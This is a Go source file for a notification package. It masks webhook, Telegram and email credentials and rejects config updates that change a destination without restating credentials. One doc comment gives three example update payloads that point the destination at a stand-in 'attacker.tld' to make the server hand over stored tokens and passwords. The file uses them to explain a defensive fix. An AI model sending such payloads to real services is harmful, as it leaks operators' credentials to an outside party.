package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix marks a masked value. The API replaces credentials with values carrying this
// prefix on echo; an update receiving one means 'keep the stored value'.
//
// A prefix — rather than an empty string or fixed constant — lets the value carry a bit of
// identifying info (see MaskedValue) so users can tell 'which bot this is' without re-pasting
// the secret.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              original too short, no hint
//	"__masked__:…ab12cd"      last 6 chars of the original as an identification hint
//
// Exposing only the last 6 is deliberate: a webhook URL's identifying part sits at the end
// (WeCom's key, Feishu's bot id) while the prefix is identical across bots — useless. Six
// chars can't reconstruct the credential but can tell the configurer 'that's my group'.
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is masked (i.e. the API echo went unmodified).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a config copy with the channel's credential fields masked.
//
// An unknown kind returns an empty map, not the raw config — better a UI saying 'config
// unavailable' than echoing possibly-credential-bearing content for an unrecognizable kind.
// Non-credential fields pass through so the UI renders normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures like headers count as a single credential: per-subkey rules would need
		// each channel to declare 'which subkeys are credentials' — complexity far beyond payoff.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means 'the destination changed but the caller
// made no statement on credential fields'. Returned instead of silently allowing or
// silently dropping credentials — see PrepareConfigUpdate for why.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys left unaddressed
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "destination (" + strings.Join(e.Changed, ", ") + ") changed — re-fill the credential fields (" +
		strings.Join(e.Missing, ", ") + "): enter new values, or explicitly leave empty if credentials are no longer needed. " +
		"The old credentials were only valid for the old address; reusing them hands them to the new one."
}

// PrepareConfigUpdate merges a channel config and handles the security-sensitive
// 'destination changed' case.
//
// It replaces bare MergeConfig on the channel-update path, closing this verified-exploitable
// route: destination (where messages go) and credentials (which identity sends) are two
// independent field sets, while MergeConfig keeps stored values for unmentioned keys. So
// anyone able to PATCH a channel could **change only the address and say nothing about
// credentials**, making the server post the stored real credentials to an endpoint they
// control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → original Authorization header goes out
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → username+password handed over after STARTTLS
//
// Fully silent, needs no redirect (so refusing cross-host redirects can't stop it), and
// it directly defeats this package's masking goal — 'credentials never echo to the browser'.
//
// Rule: once a destination key takes a new value, the caller must make an explicit statement
// on **every** credential key:
//   - a new value → use it
//   - an explicit empty string → that field no longer needs a credential (clearing kept)
//   - the echoed mask value / the key omitted entirely → reject
//
// The third case is rejected because a mask value literally means 'reuse the old
// credential' — and the old credential is only valid for the old address. Deliberately no
// 'auto-drop credentials': on optional credential fields (webhook headers, email password)
// that silently becomes 'auth gone but the API returned 200' — harder to debug than an
// error. Better to make the operator fill it in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("unregistered channel kind %q", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// A non-string credential value (webhook's headers is an object) embedding the mask literal
	// means the caller stuffed the 'keep original' sentinel inside a structure. MergeConfig only
	// recognizes 'a string with the prefix' as masked — this form would be stored as a normal
	// object: the literal "__masked__" lands in the DB, auth silently breaks with no error.
	// Better to reject.
	//
	// This check must run **first**: an unchanged address takes the early return, so placing it
	// later would cover only the 'address changed' path (the first version got this wrong — a
	// test caught it immediately).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find which destination keys truly changed. A mask value counts as 'unchanged'.
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Address unchanged: plain merge (mask keeps original, empty string clears, others overwrite).
		return MergeConfig(stored, incoming), nil
	}

	// Address changed: every credential key needs an explicit statement.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers refuses mask sentinels nested inside non-string structures.
//
// Masking assumes 'the whole value is a string'. An object field like webhook's headers can
// only be masked wholesale (the string "__masked__") or submitted wholesale; a sentinel
// inside the object can neither express 'unchanged' nor avoids being stored as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains mask marker %q inside its content: the field must be left blank wholesale to keep the old value, or submitted wholesale as a new value — mask placeholders can't ride inside a structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares two config values for equivalence. JSON serialization handles
// type drift — the frontend submits a port as number while the DB reads back float64; bare
// == would misjudge.
//
// 'Empty' must be normalized before comparing: "" and 'key absent' are the same state in
// this config model, because MergeConfig treats "" as explicit clear and deletes the key.
// Without normalization, an optional destination field that stays empty (Telegram's base_url
// is the only one: empty = official API) would flow down this path —
//
//	created with base_url:""  →  first save deletes the key via MergeConfig
//	→ second save: incoming "", stored key missing → judged 'address changed'
//	→ credential is a mask value → 400 'destination changed, re-fill credentials'
//
// Every later save fails until the user re-pastes the Bot Token — having changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue decides whether a config value counts as 'empty'.
// The standard must match MergeConfig's clearing rule (strings.TrimSpace(s) == "") — or a
// gap opens where MergeConfig deletes while sameConfigValue sees a value.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming over stored for channel-config updates.
//
// Rules:
//   - keys whose incoming value is masked → keep stored value (user didn't touch the field)
//   - keys whose incoming value is "" → explicit clear, delete the key
//   - other keys → overwritten by incoming
//   - keys in stored but not incoming → kept (partial-update semantics)
//
// Whether "" means 'clear' needs pinning down: forms submit unfilled fields as empty
// strings; writing those as real values would erase 'leave blank to keep' fields. Explicit
// clear is chosen because clearing a misconfigured field has no other expression
// (torn-off fields could distinguish 'absent' from 'present-but-empty', but the UI doesn't
// need it).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // mask value = unmodified; keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
